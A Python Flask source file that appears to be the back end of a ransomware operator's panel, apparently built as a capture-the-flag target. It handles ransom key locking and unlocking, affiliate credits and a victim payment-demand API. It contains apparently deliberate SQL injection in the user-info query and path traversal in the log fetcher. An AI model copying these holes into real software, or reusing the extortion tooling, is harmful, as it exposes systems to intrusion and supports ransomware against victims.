#!/usr/bin/env python

from datetime import datetime
from flask import Flask, jsonify, render_template, request, redirect, make_response, send_file, send_from_directory
from flask_bootstrap import Bootstrap
from os.path import realpath, exists
from . import util
import json
import os
import random
import subprocess
import sys



app = Flask(__name__)
Bootstrap(app)

def expected_pathkey():
	return "sfukthmjthqxfjdy"

def forum():
	return render_template('forum.html')


def userinfo():
	""" Create a page that displays information about a user """			
	query = request.values.get('user')
	if query == None:
		query =  util.get_username()	
	userName = memberSince = clientsHelped = hackersHelped = contributed = ''
	with util.userdb() as con:	
		infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query
		row = con.execute(infoquery).fetchone()	
		if row != None:
			userName = query
			memberSince = int(row[0])
			clientsHelped = int(row[1])
			hackersHelped = int(row[2])
			contributed = int(row[3])
	if memberSince != '':
		memberSince = datetime.utcfromtimestamp(int(memberSince)).strftime('%Y-%m-%d')
	resp = make_response(render_template('userinfo.html', 
		userName=userName,
		memberSince=memberSince, 
		clientsHelped=clientsHelped,
		hackersHelped=hackersHelped, 
		contributed=contributed,
		pathkey=expected_pathkey()))
	return resp


def navpage():
	return render_template('home.html')

def loginpage():
	if request.method == 'POST':
		cookie = util.login(request.form['username'], request.form['password'])
		if cookie is None:
			# Invalid login
			return render_template('login.html', message="Invalid login, please try again.")
		resp = make_response(redirect(f"/{expected_pathkey()}"), 302)
		resp.set_cookie('tok', cookie)
	return render_template('login.html', message="")

def adminlist():
	""" Generate the list of current admins.
	 	This page also shows former admins, for the sake of populating the page with more text. """	
	with util.userdb() as con:
		adminlist = [row[0] for row in con.execute("SELECT userName FROM Accounts WHERE isAdmin = 1")]			
		return render_template('adminlist.html',adminlist=adminlist)

def admin():
	return render_template('admin.html')

def fetchlog():
	log = request.args.get('log')
	return send_file("/opt/ransommethis/log/" + log)

def lock():
	if request.args.get('demand') == None:
		return render_template('lock.html')
	else:
		cid = random.randrange(10000, 100000)
		result = subprocess.run(["/opt/keyMaster/keyMaster", 
								 'lock',
								 str(cid),
								 request.args.get('demand'),
								 util.get_username()],
								 capture_output=True, check=True, text=True, cwd="/opt/keyMaster/")
		jsonresult = json.loads(result.stdout)
		if 'error' in jsonresult:
			response = make_response(result.stdout)
			response.mimetype = 'application/json'
			return response
		
		with open("/opt/ransommethis/log/keygeneration.log", 'a') as logfile:
			print(f"{datetime.now().replace(tzinfo=None, microsecond=0).isoformat()}\t{util.get_username()}\t{cid}\t{request.args.get('demand')}", file=logfile)
		return jsonify({'key': jsonresult['plainKey'], 'cid': cid})

def unlock():
	if request.args.get('receipt') == None:
		return render_template('unlock.html')
	else:
		result = subprocess.run(["/opt/keyMaster/keyMaster", 
								 'unlock', 
								 request.args.get('receipt')],
								capture_output=True, check=True, text=True, cwd="/opt/keyMaster/")
		response = make_response(result.stdout)
		response.mimetype = 'application/json'
		return response

def credit():
	args = None	
	if request.method == "GET":
		args = request.args
	elif request.method == "POST":
		args = request.form
	if args.get('receipt') == None or args.get('hackername') == None or args.get('credits') == None:
		# Missing a required argument
		return jsonify({"error": "missing argument"}), 400
	result = subprocess.run(["/opt/keyMaster/keyMaster", 
							'credit',
							args.get('hackername'),
							args.get('credits'),
							args.get('receipt')],
							capture_output=True, check=True, text=True, cwd="/opt/keyMaster")
	response = make_response(result.stdout)
	response.mimetype = 'application/json'
	return response

# API for payment site
@app.route("/demand")
def demand():
	d = dict()
	with util.victimdb() as con:
		row = con.execute('SELECT dueDate, Baddress, pAmount FROM Victims WHERE cid = ?', (request.args.get('cid'),)).fetchone()
		if row is not None:
			d['exp_date'] = row[0]
			d['address'] = row[1]
			d['amount'] = row[2]
	resp = jsonify(d)
	resp.headers.add('Access-Control-Allow-Origin', '*')
	return resp


@app.route("/", defaults={'pathkey': '', 'path': ''}, methods=['GET', 'POST'])
@app.route("/<path:pathkey>", defaults={'path': ''}, methods=['GET', 'POST'])
@app.route("/<path:pathkey>/<path:path>", methods=['GET', 'POST'])
def pathkey_route(pathkey, path):
	if pathkey.endswith('/'):
		# Deal with weird normalization
		pathkey = pathkey[:-1]
		path = '/' + path

	# Super secret path that no one will ever guess!
	if pathkey != expected_pathkey():
		return render_template('unauthorized.html'), 403
	# Allow access to the login page, even if they're not logged in
	if path == 'login':
		return loginpage()
	# Check if they're logged in.
	try:
		uid = util.get_uid()
	except util.InvalidTokenException:
		return redirect(f"/{pathkey}/login", 302)
	
	# At this point, they have a valid login token
	if path == "":
		return redirect(f"/{pathkey}/", 302)
	elif path == "/" or path == 'home':
		return navpage()
	elif path == 'adminlist':
		return adminlist()
	elif path == 'userinfo':
		return userinfo()
	elif path == 'forum':
		return forum()
	elif path == 'lock':
		return lock()
	elif path == 'unlock':
		return unlock()
	# Admin only functions beyond this point
	elif path == 'admin':
		return util.check_admin(admin)
	elif path == 'fetchlog':
		return util.check_admin(fetchlog)
	elif path == 'credit':
		return util.check_admin(credit)
	# Default
	return render_template('404.html'), 404
